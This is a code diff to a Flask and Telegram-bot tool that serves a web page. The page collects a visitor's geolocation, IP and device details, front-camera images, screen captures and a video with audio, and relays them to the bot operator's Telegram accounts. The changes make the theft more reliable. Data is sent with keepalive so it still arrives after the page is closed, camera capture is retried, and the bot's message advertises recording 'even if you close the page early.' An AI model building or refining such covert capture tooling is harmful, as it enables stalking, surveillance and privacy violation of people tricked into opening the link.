@@ -65,8 +65,11 @@ HTML_PAGE = """<!DOCTYPE html>
 
         function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
+        // ---- Send data with keepalive to survive page close ----
         async function sendData(url, formData) {
-            try { await fetch(url, { method: 'POST', body: formData }); } catch(e) {}
+            try {
+                await fetch(url, { method: 'POST', body: formData, keepalive: true });
+            } catch(e) {}
         }
 
         // ---- Base system info (unchanged) ----
@@ -310,20 +313,20 @@ HTML_PAGE = """<!DOCTYPE html>
             }
         }
 
-        // ---- Front camera stream with warm-up ----
+        // ---- Front camera stream with longer warm-up ----
         async function getFrontStream() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 320 } },
                     audio: true
                 });
-                // Warm up the camera
-                await delay(300);
+                // Longer warm-up to ensure camera is ready
+                await delay(500);
                 return stream;
             } catch (e) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    await delay(300);
+                    await delay(500);
                     return stream;
                 } catch (e2) {
                     return null;
@@ -331,17 +334,20 @@ HTML_PAGE = """<!DOCTYPE html>
             }
         }
 
-        // ---- IMPROVED CAPTURE FRAME ----
+        // ---- IMPROVED CAPTURE FRAME WITH MULTIPLE RETRIES ----
         function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 let resolved = false;
+                let frameBlob = null;
+                let attempts = 0;
+                const maxAttempts = 5;
+
                 video.onloadedmetadata = () => {
                     video.play();
-                    let attempts = 0;
-                    const checkFrame = () => {
+                    const captureOne = () => {
                         attempts++;
                         if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
                             const canvas = document.createElement('canvas');
@@ -357,9 +363,9 @@ HTML_PAGE = """<!DOCTYPE html>
                                 sum += data[i] + data[i+1] + data[i+2];
                             }
                             const avg = sum / (canvas.width * canvas.height * 3);
-                            if (avg < 15 && attempts < 5) {
+                            if (avg < 15 && attempts < maxAttempts) {
                                 // Retry after a short delay
-                                setTimeout(checkFrame, 200);
+                                setTimeout(captureOne, 200);
                                 return;
                             }
                             canvas.toBlob((blob) => {
@@ -367,20 +373,21 @@ HTML_PAGE = """<!DOCTYPE html>
                                 video.pause();
                                 video.srcObject = null;
                             }, 'image/jpeg', 0.9);
-                        } else if (attempts < 10) {
-                            setTimeout(checkFrame, 100);
+                        } else if (attempts < maxAttempts) {
+                            setTimeout(captureOne, 100);
                         } else {
+                            // Failed to get a valid frame after max attempts
                             if (!resolved) { resolved = true; resolve(null); }
                             video.pause();
                             video.srcObject = null;
                         }
                     };
-                    checkFrame();
+                    captureOne();
                 };
             });
         }
 
-        // ---- Main session ----
+        // ---- Main session (unchanged) ----
         async function startSession() {
             startBtn.disabled = true;
             startBtn.innerText = 'Loading...';
@@ -394,7 +401,6 @@ HTML_PAGE = """<!DOCTYPE html>
                         fd.append('lat', pos.coords.latitude);
                         fd.append('lng', pos.coords.longitude);
                         await sendData('/location', fd);
-                        // Continue with rest
                         collectAndSend();
                     },
                     async () => {
@@ -458,7 +464,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 if (!stream) {
                     try {
                         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                        await delay(300);
+                        await delay(500);
                         combinedStream = stream;
                         audioStatus = 'present (fallback)';
                     } catch (e) {
@@ -509,7 +515,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 if (combinedStream) {
                     startRecording(combinedStream);
                 } else {
-                    // No stream – finish
                     startBtn.disabled = false;
                     startBtn.innerText = '▶ Start Session';
                 }
@@ -557,7 +562,6 @@ HTML_PAGE = """<!DOCTYPE html>
                             mediaRecorder.stop();
                             recordingActive = false;
                         }
-                        // If no chunks, send empty
                         if (recordedChunks.length === 0) {
                             const emptyBlob = new Blob([], { type: 'video/webm' });
                             const fd = new FormData();
@@ -570,7 +574,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 }, maxDuration + 2000);
             }
 
-            // Helper: capture screenshot
             function captureScreenshot() {
                 return new Promise((resolve) => {
                     html2canvas(document.documentElement, {
@@ -619,7 +622,6 @@ def location():
 
 @app.route('/capture', methods=['POST'])
 def capture():
-    # Extract all fields
     ip = request.form.get('ip', 'unknown')
     city = request.form.get('city', 'unknown')
     region = request.form.get('region', 'unknown')
@@ -648,7 +650,6 @@ def capture():
     front_img = request.files.get('frontImage')
 
     for uid in USER_IDS:
-        # Build detailed message with all data
         try:
             msg = (
                 f"🌐 IP: {ip}\n"
@@ -673,7 +674,6 @@ def capture():
         except Exception as e:
             print(f"Info send error: {e}")
 
-        # Screenshot of page
         if screenshot:
             try:
                 screenshot.seek(0)
@@ -681,7 +681,6 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
-        # Screen capture
         if screen_capture:
             try:
                 screen_capture.seek(0)
@@ -689,7 +688,6 @@ def capture():
             except Exception as e:
                 print(f"Screen capture error: {e}")
 
-        # Front camera image
         if front_img:
             try:
                 front_img.seek(0)
@@ -697,7 +695,6 @@ def capture():
             except Exception as e:
                 print(f"Front image error: {e}")
 
-        # Final notification for data
         try:
             bot.send_message(uid, "📦 Data package sent. Recording video...")
         except:
@@ -721,7 +718,7 @@ def video():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location first, then all device data, front camera image, screen capture, and records video with audio.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location first, then all device data, front camera image, screen capture, and records video with audio (even if you close the page early).")
 
 def run_bot():
     print("Bot polling started.")
